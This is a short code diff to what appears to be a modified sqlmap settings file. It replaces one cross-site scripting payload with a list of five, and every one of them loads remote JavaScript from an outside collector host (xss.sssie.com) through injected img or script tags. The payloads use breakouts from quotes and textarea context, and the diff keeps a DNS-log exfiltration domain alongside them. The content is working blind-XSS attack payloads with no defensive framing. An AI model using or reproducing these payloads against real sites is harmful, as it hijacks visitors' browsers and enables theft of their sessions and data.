@@ -20,7 +20,12 @@ from lib.core.revision import getRevisionNumber
 
 # sqlmap version (<major>.<minor>.<month>.<monthly commit>)
 CLOUDEYE = ".776252.dnslog.info"
-XSSPAYLOAD = '''<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/UhnCfl';>'''
+XSSPAYLOAD =['''"><img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/UhnCfl';>''',
+             '''<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.sssie.com/UhnCfl';>''',
+             '''"><script src=http://xss.sssie.com/UhnCfl></script>''',
+             '''<script src=http://xss.sssie.com/UhnCfl></script>''',
+             '''</textarea>'"><script src=http://xss.sssie.com/UhnCfl></script>''']
+
 VERSION = "1.0.6.47"
 REVISION = getRevisionNumber()
 STABLE = VERSION.count('.') <= 2
